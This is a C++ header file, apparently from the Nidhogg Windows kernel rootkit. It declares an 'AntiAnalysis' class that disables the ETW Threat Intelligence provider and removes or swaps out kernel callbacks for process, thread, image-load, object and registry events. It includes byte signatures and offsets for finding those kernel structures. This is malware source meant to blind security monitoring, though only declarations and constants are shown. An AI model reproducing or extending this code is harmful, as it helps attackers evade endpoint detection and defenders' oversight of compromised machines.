#pragma once
#include "pch.h"

extern "C" {
	#include "WindowsTypes.hpp"
	#include "NidhoggCommon.h"
}
#include "MemoryUtils.hpp"

constexpr UCHAR EtwThreatIntProvRegHandleSignature1[] = {0x60, 0x4C, 0x8B, 0xCC};
constexpr UCHAR EtwThreatIntProvRegHandleSignature2[] = {0xD2, 0x48, 0x8B, 0xCC};
constexpr UCHAR PspCreateProcessNotifyRoutineSignature[] = { 0x4C, 0x8D, 0xCC };
constexpr UCHAR PspCreateThreadNotifyRoutineSignature[] = { 0x48, 0x8D, 0xCC };
constexpr UCHAR PspLoadImageNotifyRoutineSignature[] = { 0x48, 0x8D, 0xCC };
constexpr UCHAR CallbackListHeadSignature[] = { 0x4C, 0x8D, 0xCC };
constexpr UCHAR CmpCallbackListLockSignature[] = { 0x48, 0x8D, 0xCC };
constexpr UCHAR CmpInsertCallbackInListByAltitudeSignature[] = { 0x8B, 0xCB, 0xE8, 0xCC };
constexpr UCHAR CallFunctionSignature[] = { 0xE8, 0xCC };
constexpr UCHAR RoutinesListCountSignature[] = { 0xF0, 0xFF, 0x05, 0xCC };
constexpr SIZE_T EtwThreatIntProvRegHandleDistance = 0x29D;
constexpr SIZE_T EtwGuidEntryOffset = 0x20;
constexpr SIZE_T CallbackListHeadSignatureDistance = 0xC4;
constexpr SIZE_T CmpCallbackListLockSignatureDistance = 0x4A;
constexpr SIZE_T CmpInsertCallbackInListByAltitudeSignatureDistance = 0x108;
constexpr SIZE_T CmpRegisterCallbackInternalSignatureDistance = 0x22;
constexpr SIZE_T PspSetCreateProcessNotifyRoutineSignatureDistance = 0x20;
constexpr SIZE_T PspSetCreateThreadNotifyRoutineSignatureDistance = 0xF;
constexpr SIZE_T PsSetLoadImageNotifyRoutineExDistance = 0xF;
constexpr SIZE_T PspCreateProcessNotifyRoutineDistance = 0xC3;
constexpr SIZE_T PspCreateThreadNotifyRoutineDistance = 0x9B;
constexpr SIZE_T PspLoadImageNotifyRoutineDistance = 0x10B;
constexpr SIZE_T EtwThreatIntProvRegHandleOffset = 8;
constexpr SIZE_T CallFunctionOffset = 5;
constexpr SIZE_T CmpInsertCallbackInListByAltitudeOffset = 7;
constexpr SIZE_T CmpCallbackListLockOffset = 7;
constexpr SIZE_T CallbacksListCountOffset = 3;
constexpr SIZE_T RoutinesListOffset = 7;
constexpr SIZE_T PsNotifyRoutinesRoutineCountOffset = 0xB;
constexpr SIZE_T MAX_DRIVER_PATH = 256;
constexpr SIZE_T MAX_KERNEL_CALLBACKS = 256;

enum CallbackType {
	ObProcessType,
	ObThreadType,
	PsCreateProcessTypeEx,
	PsCreateProcessType,
	PsCreateThreadType,
	PsCreateThreadTypeNonSystemThread,
	PsImageLoadType,
	CmRegistryType
};

struct KernelCallback {
	CallbackType Type;
	ULONG64 CallbackAddress;
};

struct DisabledKernelCallback {
	CallbackType Type;
	ULONG64 CallbackAddress;
	ULONG64 Entry;
};

struct ObCallback {
	PVOID PreOperation;
	PVOID PostOperation;
	CHAR DriverName[MAX_DRIVER_PATH];
};

struct PsRoutine {
	ULONG64 CallbackAddress;
	CHAR DriverName[MAX_DRIVER_PATH];
};

struct CmCallback {
	ULONG64 CallbackAddress;
	ULONG64 Context;
	CHAR DriverName[MAX_DRIVER_PATH];
};

struct ObCallbacksList {
	CallbackType Type;
	ULONG NumberOfCallbacks;
	ObCallback* Callbacks;
};

struct PsRoutinesList {
	CallbackType Type;
	ULONG NumberOfRoutines;
	PsRoutine* Routines;
};

struct CmCallbacksList {
	ULONG NumberOfCallbacks;
	CmCallback* Callbacks;
};

OB_PREOP_CALLBACK_STATUS ObPreOpenDummyFunction(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info);
VOID ObPostOpenDummyFunction(PVOID RegistrationContext, POB_POST_OPERATION_INFORMATION Info);
void CreateProcessNotifyExDummyFunction(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo);
void CreateProcessNotifyDummyFunction(HANDLE ParentId, HANDLE ProcessId, BOOLEAN Create);
void CreateThreadNotifyDummyFunction(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create);
void LoadImageNotifyDummyFunction(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO ImageInfo); 
NTSTATUS RegistryCallbackDummyFunction(PVOID CallbackContext, PVOID Argument1, PVOID Argument2);

class AntiAnalysis {
private:
	DisabledKernelCallback DisabledCallbacks[MAX_KERNEL_CALLBACKS];
	ULONG DisabledCallbacksCount;
	ULONG PrevEtwTiValue;
	FastMutex Lock;

	NTSTATUS MatchCallback(PVOID callack, CHAR driverName[MAX_DRIVER_PATH]);
	NTSTATUS AddDisabledCallback(DisabledKernelCallback Callback);
	NTSTATUS RemoveDisabledCallback(KernelCallback* Callback, DisabledKernelCallback* DisabledCallback);

public:
	void* operator new(size_t size) {
		return ExAllocatePoolWithTag(NonPagedPool, size, DRIVER_TAG);
	}

	void operator delete(void* p) {
		ExFreePoolWithTag(p, DRIVER_TAG);
	}

	AntiAnalysis();
	~AntiAnalysis();

	NTSTATUS EnableDisableEtwTI(bool enable);
	NTSTATUS RestoreCallback(KernelCallback* Callback);
	NTSTATUS RemoveCallback(KernelCallback* Callback);
	NTSTATUS ListObCallbacks(ObCallbacksList* Callbacks);
	NTSTATUS ListPsNotifyRoutines(PsRoutinesList* Callbacks, ULONG64 ReplacerFunction, ULONG64 ReplacedFunction);
	NTSTATUS ListRegistryCallbacks(CmCallbacksList* Callbacks, ULONG64 ReplacerFunction, ULONG64 ReplacedFunction);
};

inline AntiAnalysis* NidhoggAntiAnalysis;
